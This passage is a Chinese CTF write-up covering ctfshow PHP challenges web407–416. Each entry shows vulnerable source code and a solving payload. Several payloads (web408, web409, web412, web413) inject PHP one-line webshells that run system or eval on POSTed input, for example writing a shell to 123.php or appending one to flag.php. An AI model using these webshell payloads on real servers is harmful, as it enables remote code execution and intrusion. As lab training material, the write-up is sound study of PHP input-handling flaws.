h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-16 14:58:50</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-16 17:24:13</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$ip</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$ip</span>,FILTER_VALIDATE_IP))&#123;</span><br><span class="line">    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$ip</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cafe</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>IPv6的128位地址通常写成8组，每组为四个十六进制数的形式。比如：AD80:0000:0000:0000:ABAA:0000:00C2:0002 是一个合法的IPv6地址。这个地址比较长，看起来不方便也不易于书写。零压缩法可以用来缩减其长度。如果几个连续段位的值都是0，那么这些0就可以简单的以::来表示</p><p><strong>call_user_func</strong></p><p><img src="../images/image-20230331160426788.png" alt="image-20230331160426788"></p><p>然后就可以写出payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cafe::add</span><br></pre></td></tr></table></figure><h2 id="web408"><a href="#web408" class="headerlink" title="web408"></a>web408</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-16 14:58:50</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-16 19:53:18</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$email</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$email</span>,FILTER_VALIDATE_EMAIL))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;@&#x27;</span>, <span class="variable">$email</span>)[<span class="number">1</span>], <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;@&#x27;</span>, <span class="variable">$email</span>)[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>explode就是分割函数</strong></p><p>就是将传进来的email分割成两部分，前面是filename,后面是content</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">email=<span class="string">&quot;&lt;?=system(<span class="subst">$_POST</span>[1]);?&gt;&quot;</span>@<span class="number">123</span>.php</span><br></pre></td></tr></table></figure><p>绕过的原因是<strong>非法字符可以放在双引号里面绕过检测</strong></p><p>这里用短标签的意思是因为，不能有空格，因为有个双引号然后浏览器会把空格<a href="https://so.csdn.net/so/search?q=转义&amp;spm=1001.2101.3001.7020">转义</a>为%20，然后因为双引号包含，最后导致写不进文件</p><h2 id="web409"><a href="#web409" class="headerlink" title="web409"></a>web409</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-16 14:58:50</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-16 20:26:16</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$email</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$email</span>,FILTER_VALIDATE_EMAIL))&#123;</span><br><span class="line">    <span class="variable">$email</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/.flag/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$email</span>);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$email</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目有个替换为<code>.flag</code>也就是把flag和它前面那个字符替换为空，这就可以把emai当中前面双引号这个非法字符给替换掉，避免在php环境里面出错</p><p>@后面是不符合php语句格式的字符尝试闭合网页当中前面的<code>&lt;?php</code></p><p><strong>这就是为什么会输出@123.com的原因</strong></p><p><img src="../images/image-20230331165032665.png" alt="image-20230331165032665"></p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">email=<span class="string">&quot;flagsystem(<span class="subst">$_POST</span>[1]);?&gt;&quot;</span>@<span class="number">123</span>.com</span><br><span class="line">然后post数据</span><br><span class="line"><span class="number">1</span>=cat /flag</span><br></pre></td></tr></table></figure><p>会把”flag给替换成空，然后就会执行eval(system($_POST[1]);?&gt;)</p><p>这里执行虽然会报错，但是还是能执行的</p><h2 id="web410"><a href="#web410" class="headerlink" title="web410"></a>web410</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-26 13:12:41</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$b</span>,FILTER_VALIDATE_BOOLEAN))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$b</span>==<span class="string">&#x27;true&#x27;</span> || <span class="title function_ invoke__">intval</span>(<span class="variable">$b</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;FLAG NOT HERE&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://www.w3school.com.cn/php/filter_validate_boolean.asp">参考文章</a></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b=yes</span><br></pre></td></tr></table></figure><h2 id="web411"><a href="#web411" class="headerlink" title="web411"></a>web411</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-26 13:12:41</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$b</span>,FILTER_VALIDATE_BOOLEAN))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$b</span>==<span class="string">&#x27;true&#x27;</span> || <span class="title function_ invoke__">intval</span>(<span class="variable">$b</span>)&gt;<span class="number">0</span> ||<span class="variable">$b</span>==<span class="string">&#x27;on&#x27;</span> || <span class="variable">$b</span>==<span class="string">&#x27;ON&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;FLAG NOT HERE&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b=yes</span><br></pre></td></tr></table></figure><h2 id="web412"><a href="#web412" class="headerlink" title="web412"></a>web412</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-26 16:19:28</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>, <span class="string">&#x27;//&#x27;</span>.<span class="variable">$ctfshow</span>,FILE_APPEND);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: ctfshow in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">16</span></span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>])<span class="meta">?&gt;</span>;&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(‘cat flag.php’);</span><br></pre></td></tr></table></figure><p>因为就是题目的代码都是只有&lt;?php 而没有结尾，所以我们就可以通过写</p><p>?&gt;给前面代码给包含了，然后就绕过注释了，然后后面在自己加一句话木马进去到flag.php里就行了</p><p><img src="../images/image-20230331171044704.png" alt="image-20230331171044704"></p><p><img src="../images/image-20230331171032907.png" alt="image-20230331171032907"></p><p>这就是为什么不会覆盖掉原有的flag的原因</p><h2 id="web413"><a href="#web413" class="headerlink" title="web413"></a>web413</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-26 16:19:28</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>, <span class="string">&#x27;/*&#x27;</span>.<span class="variable">$ctfshow</span>.<span class="string">&#x27;*/&#x27;</span>,FILE_APPEND);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: ctfshow in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">16</span></span><br></pre></td></tr></table></figure><p>原理差不多，就是绕过过滤,就是包含注释就行</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="comment">/*</span></span><br></pre></td></tr></table></figure><h2 id="web414"><a href="#web414" class="headerlink" title="web414"></a>web414</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-26 16:43:53</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>==<span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sqrt</span>(<span class="variable">$ctfshow</span>)&gt;=<span class="title function_ invoke__">sqrt</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$flag</span>)))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;FLAG_NOT_HERE&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Notice: Undefined index: ctfshow in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">16</span></span><br></pre></td></tr></table></figure><p>这里的sqrt是计算平方根的意思</p><p><strong>布尔值true和任意字符串都弱相等</strong></p><p>intval($flag)    ——-&gt;   0</p><p>所以随便传个负值就行了</p><h2 id="web415"><a href="#web415" class="headerlink" title="web415"></a>web415</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-26 19:15:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$k</span> = <span class="variable">$_GET</span>[k];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$k</span>==<span class="string">&#x27;getflag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;FLAG_NOT_HERE&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$k</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>== ：弱等于。在比较前会先把两种字符串类型转成相同的再进行比较。简单的说，它不会比较变量类型，只比较值。</p><p>若一个数字和一个字符串进行比较或者进行运算时，PHP会把字符串转换成数字再进行比较。若字符串以数字开头，则取开头数字作为转换结果，不能转换为数字的字符串（例如”aaa”是不能转换为数字的字符串，而”123”或”123aa”就是可以转换为数字的字符串）或null，则转换为0</p><p><strong>函数名、方法名、类名 不区分大小写</strong></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?k=Getflag</span><br></pre></td></tr></table></figure><h2 id="web416"><a href="#web416" class="headerlink" title="web416"></a>web416</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-26 19:54:23</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;fake flag&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span> <span class="keyword">extends</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="title function_ invoke__">show</span>(<span 